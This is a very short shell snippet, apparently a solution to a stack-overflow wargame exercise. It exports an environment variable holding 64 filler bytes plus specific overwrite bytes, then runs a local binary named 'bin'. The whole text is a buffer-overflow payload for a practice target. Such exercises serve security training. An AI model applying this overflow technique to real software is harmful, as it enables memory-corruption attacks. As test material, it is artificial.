# Create Payload
export GREENIE=$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"\x0a\x0d\x0a\x0d" + b"\n")')
./bin

